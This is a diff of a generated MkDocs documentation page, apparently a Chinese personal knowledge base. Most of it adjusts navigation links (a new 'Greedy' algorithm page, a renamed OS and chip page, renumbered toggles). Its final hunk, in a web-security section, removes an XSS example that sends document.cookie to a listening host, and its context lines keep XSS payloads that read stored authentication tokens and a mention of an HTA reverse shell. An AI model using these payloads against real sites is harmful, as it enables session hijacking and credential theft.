@@ -2490,6 +2490,18 @@
   </li>
 
         
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../design/algorithm/search/Greedy/" title="Greedy" class="md-nav__link">
+      Greedy
+    </a>
+  </li>
+
+        
       </ul>
     </nav>
   </li>
@@ -3113,8 +3125,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../environment/os/查看操作系统版本/" title="查看操作系统版本" class="md-nav__link">
-      查看操作系统版本
+    <a href="../../environment/os/芯片处理器与操作系统版本/" title="芯片处理器与操作系统版本" class="md-nav__link">
+      芯片处理器与操作系统版本
     </a>
   </li>
 
@@ -3393,27 +3405,15 @@
           
 
 
-  <li class="md-nav__item">
-    <a href="../../other/芯片与处理器/" title="芯片与处理器" class="md-nav__link">
-      芯片与处理器
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-11" type="checkbox" id="nav-6-11">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-10" type="checkbox" id="nav-6-10">
     
-    <label class="md-nav__link" for="nav-6-11">
+    <label class="md-nav__link" for="nav-6-10">
       Dts
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-6-11">
+      <label class="md-nav__title" for="nav-6-10">
         Dts
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -3479,13 +3479,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-12" type="checkbox" id="nav-6-12">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-11" type="checkbox" id="nav-6-11">
     
-    <label class="md-nav__link" for="nav-6-12">
+    <label class="md-nav__link" for="nav-6-11">
       Health
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-6-12">
+      <label class="md-nav__title" for="nav-6-11">
         Health
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -4923,17 +4923,6 @@ run
 </ul>
 <div class="admonition example">
 <p class="admonition-title">示例</p>
-<ul>
-<li>利用XSS获取cookie：启动一个服务器接收请求，利用XSS发送请求<code>&lt;script&gt;document.write('&lt;img src="http://192.168.56.10:88/'+document.cookie+'"&gt;');&lt;/script&gt;</code>，获取受害者cookie。</li>
-</ul>
-<div class="admonition warning">
-<p class="admonition-title">前提</p>
-<ol>
-<li>cookie没有开启httponly</li>
-<li>启动一个http服务器：<code>python -m SimpleHTTPServer 88</code></li>
-<li>有用户交互</li>
-</ol>
-</div>
 <ul>
 <li>利用XSS获取HTML5本地存储<code>&lt;script&gt;alert(window.localStorage.MessageOfTheDay);&lt;/script&gt;</code>或会话存储<code>&lt;script&gt;alert(window.sessionStorage.getItem("Secure.AuthenticationToken"));&lt;/script&gt;</code></li>
 <li>利用XSS诱骗受害者下载运行HTA获取反弹shell</li>
